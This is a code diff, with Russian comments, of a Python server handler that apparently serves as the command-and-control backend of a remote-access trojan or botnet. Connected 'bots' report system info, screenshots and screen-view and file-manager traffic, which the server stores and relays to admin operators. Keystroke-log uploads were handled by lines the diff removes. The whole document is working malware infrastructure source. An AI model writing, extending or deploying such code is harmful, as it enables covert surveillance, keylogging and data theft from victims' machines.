@@ -2,28 +2,31 @@
 
 import asyncio
 import socket
+from datetime import datetime
 from typing import Optional, Dict, Any, Tuple
 
 import backend.LoggerWrapper as logger
 from backend.Services.network import NetworkProtocol
-
-# ИСПРАВЛЕННЫЕ ИМПОРТЫ:
-# Авторизацию берем из Auth.py
 from backend.Services.Auth import authorize_bot, sync_bot_data
-# Хранилища берем из ClientManager.py
 from backend.Services.ClientManager import active_clients, preview_cache
-
 from backend.Services.SystemState import system_state
 from backend.Services.FileManager import file_service
 from backend.API.connection_manager import manager
 from backend import add_bytes
+from backend.Database import db_get_bots, db_update_bot
+
 
 class BotConnectionHandler:
     """
-    Обработчик входящих TCP-соединений от ботов V8.0.
+    Обработчик входящих TCP-соединений от ботов версии 8.0.
+    Обеспечивает жизненный цикл сессии, маршрутизацию пакетов и синхронизацию состояний.
+    Схема пакета: [HEADER: 8 bytes] + [ID: variable] + [METADATA: string] + [PAYLOAD: bytes/json].
     """
 
     async def handle_new_connection(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
+        """
+        Управляет процессом авторизации и основным циклом прослушивания сокета.
+        """
         bot_identifier: Optional[str] = None
         peer_address_info: Tuple[str, int] = writer.get_extra_info("peername")
         peer_host: str = peer_address_info[0]
@@ -32,90 +35,100 @@ class BotConnectionHandler:
             client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 
         try:
-            # 1. Авторизация (теперь импортируется из Auth.py)
             auth_result = await authorize_bot(reader, peer_host)
             if not auth_result:
                 return await self._force_close_stream(writer)
 
             bot_identifier, _ = auth_result
             active_clients[bot_identifier] = (reader, writer)
-            
+
             sync_bot_data(bot_identifier, {"status": "online"})
-            
-            # Рассылка состояния админам
             manager.broadcast_packet_sync(system_state.get_global_update_packet())
-            if (prev_packet := system_state.get_preview_packet(bot_identifier)):
-                manager.broadcast_packet_sync(prev_packet)
 
-            logger.Log.success(f"[Core] Bot connected: {bot_identifier}")
+            if (preview_packet := system_state.get_preview_packet(bot_identifier)):
+                manager.broadcast_packet_sync(preview_packet)
 
-            # 4. Основной цикл
+            logger.Log.success(f"[{self.__class__.__name__}] Bot session started: {bot_identifier}")
+
             while True:
                 try:
-                    packet_data = await asyncio.wait_for(
-                        NetworkProtocol.read_packet(reader), 
-                        timeout=45.0
+                    # Используем новый метод для получения сырых байт и распарсенных данных одновременно
+                    raw_buffer, current_id, metadata, payload = await asyncio.wait_for(
+                        NetworkProtocol.read_packet_full(reader),
+                        timeout=65.0
                     )
-                except asyncio.TimeoutError: 
+                except (asyncio.TimeoutError, ConnectionResetError, BrokenPipeError, asyncio.IncompleteReadError):
                     break
 
-                current_id, metadata, payload = packet_data
-                if not current_id or metadata is None: break
+                if not raw_buffer or not current_id:
+                    break
+                
+                # Статистика трафика по размеру всего пакета
+                add_bytes(len(raw_buffer))
 
-                # Трафик
-                p_size = 5 if metadata["type"] == "int" else len(payload)
-                m_str = f"{metadata['module']}:{metadata['type']}:{metadata['action']}:{metadata['extra']}"
-                add_bytes(8 + len(current_id) + len(m_str) + p_size)
+                target_module = metadata["module"]
+                current_timestamp = datetime.now().strftime("%H:%M:%S")
 
-                target_mod = metadata["module"]
-
-                if target_mod == "SystemInfo":
+                if target_module == "SystemInfo":
+                    # Для SystemInfo нам нужно обновить payload перед синхронизацией
+                    payload["last_active"] = current_timestamp
+                    payload["status"] = "online"
                     sync_bot_data(current_id, payload)
                     manager.broadcast_packet_sync(system_state.get_global_update_packet())
 
-                elif target_mod == "Preview":
+                elif target_module == "Preview":
                     if isinstance(payload, bytes) and payload:
                         preview_cache[current_id] = payload
-                        if (p_pkt := system_state.get_preview_packet(current_id, payload)):
-                            manager.broadcast_packet_sync(p_pkt)
+                        bot_data = db_get_bots().get(current_id, {"id": current_id})
+                        bot_data["last_active"] = current_timestamp
+                        db_update_bot(current_id, bot_data)
+                        
+                        # Пробрасываем оригинальный пакет превью админам
+                        manager.broadcast_packet_sync(raw_buffer)
+                        # И уведомляем об обновлении списка
+                        manager.broadcast_packet_sync(system_state.get_global_update_packet())
 
-                elif target_mod == "Keylogger":
-                    if metadata["action"] == "START":
-                        file_service.init_transfer(current_id, metadata["extra"], payload)
-                    else:
-                        await file_service.write_chunk(current_id, metadata["extra"], payload)
-
-                elif target_mod == "Heartbeat":
+                elif target_module == "Heartbeat":
                     if metadata["action"] == "PING":
-                        res = NetworkProtocol.pack_packet(current_id, "Heartbeat", "str", "PONG", "none", "")
-                        writer.write(res)
+                        bot_data = db_get_bots().get(current_id, {"id": current_id})
+                        bot_data["last_active"] = current_timestamp
+                        db_update_bot(current_id, bot_data)
+                        
+                        response_packet = NetworkProtocol.pack_packet(current_id, "Heartbeat", "str", "PONG", "none", "")
+                        writer.write(response_packet)
                         await writer.drain()
 
                 else:
-                    # Транзит всех остальных команд на фронтенд
-                    transit = NetworkProtocol.pack_packet(
-                        current_id, target_mod, metadata["type"], 
-                        metadata["action"], metadata["extra"], payload
-                    )
-                    manager.broadcast_packet_sync(transit)
+                    # ВСЕ ОСТАЛЬНЫЕ МОДУЛИ (ScreenView, FileManager и т.д.)
+                    # Сквозной проброс БЕЗ перепаковки. Используем raw_buffer.
+                    manager.broadcast_packet_sync(raw_buffer)
 
-        except Exception as e:
-            logger.Log.error(f"[Core] Handler error: {e}")
+        except Exception as exception_instance:
+            logger.Log.error(f"[{self.__class__.__name__}] Handler error for {bot_identifier}: {exception_instance}")
         finally:
             await self._terminate_bot_session(bot_identifier, writer)
 
-    async def _terminate_bot_session(self, bot_id: Optional[str], writer: asyncio.StreamWriter) -> None:
-        if bot_id and bot_id in active_clients:
-            active_clients.pop(bot_id, None)
-            sync_bot_data(bot_id, {"status": "offline"})
-            # Оповещаем фронтенд об отключении
+    async def _terminate_bot_session(self, bot_identifier: Optional[str], writer: asyncio.StreamWriter) -> None:
+        """
+        Завершает сессию через ClientManager и уведомляет фронтенд.
+        """
+        if bot_identifier:
+            from backend.Services.ClientManager import close_client_session
+            # Вызываем общую логику очистки (RAM + DB + Cache)
+            await close_client_session(bot_identifier, send_termination_command=False)
+            # Отправляем обновленный список (где бот уже offline) на фронтенд
             manager.broadcast_packet_sync(system_state.get_global_update_packet())
-            logger.Log.info(f"[Core] Bot {bot_id} offline")
+            logger.Log.info(f"[{self.__class__.__name__}] Bot {bot_identifier} disconnected and cleaned up")
+
         await self._force_close_stream(writer)
 
     async def _force_close_stream(self, writer: asyncio.StreamWriter) -> None:
+        """
+        Принудительно закрывает поток передачи данных.
+        """
         try:
             if not writer.transport.is_closing():
                 writer.close()
                 await writer.wait_closed()
-        except: pass
+        except Exception:
+            pass
